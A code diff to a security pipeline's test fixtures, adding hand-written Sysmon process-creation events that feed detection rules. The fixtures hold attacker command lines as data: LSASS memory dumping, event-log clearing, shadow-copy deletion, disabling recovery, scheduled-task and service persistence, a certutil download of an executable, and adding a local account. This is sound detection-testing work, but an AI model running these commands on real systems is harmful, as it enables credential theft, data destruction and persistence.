@@ -92,6 +92,18 @@ def _derived_fixture(name: str, pick, **changes) -> dict:
     return {"raw": rec, "meta": {}}
 
 
+def _sysmon_launch(n: int, image: str, command_line: str) -> dict:
+    """A Sysmon EventID 1 (process create) fixture for the 2026-11-21 process-creation rules (win_powershell_encoded_command
+    ... win_local_account_created). HAND-WRITTEN, not a capture: image paths and command lines are the documented LOLBin /
+    attack forms, the GUIDs are invented. It proves each rule is satisfiable by the parser's real output SHAPE
+    (image_base, command_line_lc, actor.process.uid), nothing about real traffic."""
+    return {"raw": {"EventID": 1, "TimeCreated": 1750000010000 + n, "Computer": "wks-jdoe",
+                    "Image": image, "CommandLine": command_line, "ProcessId": str(4000 + n), "User": "CORP\\jdoe",
+                    "ProcessGuid": f"{{5e2f1a7c-0000-6a2f-0000-{n:012x}}}",
+                    "ParentImage": r"C:\Windows\explorer.exe", "ParentProcessId": "800",
+                    "ParentProcessGuid": "{5e2f1a7c-0000-6a2f-0000-000000000320}"}, "meta": {}}
+
+
 # One real, representative raw payload per registered parser (source_type -> raw).
 # Mirrors each parser's own test fixtures -- kept minimal, just enough to populate
 # every field branch (e.g. windows_eventlog needs one raw per handled EventID).
@@ -294,6 +306,21 @@ FIXTURES: dict[str, list[dict]] = {
                  "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                  "TargetFilename": r"C:\Users\jdoe\AppData\Local\Temp\payload.exe",
                  "User": "CORP\\jdoe"}, "meta": {}},
+        _sysmon_launch(1, r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+                       "powershell.exe -NoP -W Hidden -EncodedCommand SQBFAFgA"),
+        _sysmon_launch(2, r"C:\Windows\System32\rundll32.exe",
+                       r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Temp\l.dmp full"),
+        _sysmon_launch(3, r"C:\Tools\procdump.exe", r"procdump.exe -accepteula -ma lsass.exe C:\Temp\l.dmp"),
+        _sysmon_launch(4, r"C:\Windows\System32\wevtutil.exe", "wevtutil.exe cl Security"),
+        _sysmon_launch(5, r"C:\Windows\System32\sc.exe", r"sc.exe create updsvc binPath= C:\Temp\u.exe"),
+        _sysmon_launch(6, r"C:\Windows\System32\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
+        _sysmon_launch(7, r"C:\Windows\System32\wbem\WMIC.exe", "wmic shadowcopy delete"),
+        _sysmon_launch(8, r"C:\Windows\System32\bcdedit.exe", "bcdedit /set {default} recoveryenabled no"),
+        _sysmon_launch(9, r"C:\Windows\System32\schtasks.exe",
+                       r"schtasks /create /tn Upd /tr C:\Temp\u.exe /sc onlogon"),
+        _sysmon_launch(10, r"C:\Windows\System32\certutil.exe",
+                       r"certutil.exe -urlcache -split -f http://203.0.113.9/a.exe C:\Temp\a.exe"),
+        _sysmon_launch(11, r"C:\Windows\System32\net.exe", "net user svc_bk Passw0rd! /add"),
     ],
     "mail_gateway": [
         {"raw": {"from": "billing@vendor.example.invalid", "to": "jdoe@corp.example",
